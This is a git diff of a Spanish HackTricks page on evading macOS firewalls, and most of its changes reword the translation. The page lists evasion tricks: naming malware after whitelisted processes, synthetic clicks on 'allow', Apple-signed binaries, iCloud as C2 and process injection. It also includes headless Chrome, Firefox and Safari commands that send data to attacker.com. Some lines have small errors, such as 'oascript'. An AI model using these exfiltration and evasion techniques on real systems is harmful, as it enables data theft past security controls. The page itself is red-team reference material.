@@ -1,58 +1,58 @@
-# Evadiendo Firewalls en macOS
+# Saltando Firewalls en macOS
 
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Únete al grupo de** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) o al grupo de [**telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.
 
 </details>
 
-## Técnicas encontradas
+## Técnicas Encontradas
 
-Las siguientes técnicas se han encontrado funcionales en algunas aplicaciones de firewall de macOS.
+Las siguientes técnicas se encontraron funcionando en algunas aplicaciones de firewall de macOS.
 
 ### Abusando de nombres en la lista blanca
 
-* Por ejemplo, nombrar el malware con nombres de procesos de macOS bien conocidos como **`launchd`**&#x20;
+* Por ejemplo, llamar al malware con nombres de procesos macOS conocidos como **`launchd`**&#x20;
 
 ### Click Sintético
 
-* Si el firewall pide permiso al usuario, hacer que el malware **haga clic en permitir**
+* Si el firewall solicita permiso al usuario, hacer que el malware **haga clic en permitir**
 
 ### **Usar binarios firmados por Apple**
 
 * Como **`curl`**, pero también otros como **`whois`**
 
-### Dominios conocidos de Apple
+### Dominios de Apple conocidos
 
-El firewall podría estar permitiendo conexiones a dominios conocidos de Apple como **`apple.com`** o **`icloud.com`**. Y iCloud podría usarse como un C2.
+El firewall podría estar permitiendo conexiones a dominios de Apple conocidos como **`apple.com`** o **`icloud.com`**. Y iCloud podría ser utilizado como un C2.
 
-### Evasión Genérica
+### Bypass Genérico
 
-Algunas ideas para intentar evadir firewalls
+Algunas ideas para intentar saltar firewalls
 
 ### Verificar tráfico permitido
 
-Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en la lista blanca o qué aplicaciones tienen permiso para acceder a ellos
+Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en lista blanca o qué aplicaciones tienen permiso para acceder a ellos
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Abusando de DNS
 
-Las resoluciones de DNS se realizan a través de la aplicación firmada **`mdnsreponder`**, que probablemente estará permitida para contactar a los servidores DNS.
+Las resoluciones de DNS se realizan a través de la aplicación firmada **`mdnsreponder`**, la cual probablemente tenga permiso para contactar a los servidores DNS.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### A través de aplicaciones de navegador
+### A través de aplicaciones del navegador
 
-* **osascript**
+* **oascript**
 ```applescript
 tell application "Safari"
 run
@@ -67,6 +67,8 @@ end tell
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
+{% endcode %}
+
 * Firefox
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
@@ -75,9 +77,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### A través de inyecciones en procesos
+### A través de inyecciones de procesos
 
-Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a cualquier servidor, podrías eludir las protecciones del firewall:
+Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a cualquier servidor, podrías evadir las protecciones del firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -89,14 +91,14 @@ Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a
 
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
